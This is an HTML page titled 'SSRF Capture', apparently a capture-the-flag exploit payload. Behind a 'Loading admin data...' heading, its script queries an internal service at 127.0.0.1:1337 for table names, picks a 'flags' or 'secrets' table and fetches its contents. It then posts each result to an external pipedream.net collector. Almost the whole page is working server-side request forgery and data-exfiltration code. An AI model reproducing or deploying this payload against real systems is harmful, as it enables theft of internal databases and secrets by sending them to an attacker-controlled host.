<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SSRF Capture</title>
</head>
<body>
    <h1>Loading admin data...</h1>
    <script>
        // Step 1: Fetch the list of tables from /tables
        fetch('http://127.0.0.1:1337/tables')
            .then(response => response.text())
            .then(data => {
                // Send the tables list to RequestBin
                sendToRequestBin('tables_data', data);

                // Parse the tables to find a likely flag table (e.g., 'flags', 'secrets')
                let tables = JSON.parse(data).tables;
                let targetTable = tables.find(t => t === 'flags') || tables.find(t => t === 'secrets') || tables[0];

                // Step 2: Fetch the contents of the target table
                if (targetTable) {
                    fetch('http://127.0.0.1:1337/table', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ tableName: targetTable })
                    })
                    .then(res => res.text())
                    .then(tableData => {
                        // Send the table contents to RequestBin
                        sendToRequestBin('table_contents', tableData);
                    })
                    .catch(err => console.error('Table fetch error:', err));
                }
            })
            .catch(err => console.error('Tables fetch error:', err));

        // Function to send data to RequestBin
        function sendToRequestBin(key, value) {
            fetch('https://eoi9s074jcny7f1.m.pipedream.net', {  // Replace with your RequestBin URL
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `${key}=${encodeURIComponent(value)}`
            })
            .then(() => console.log(`Sent ${key} to RequestBin`))
            .catch(err => console.error('RequestBin error:', err));
        }
    </script>
</body>
</html>
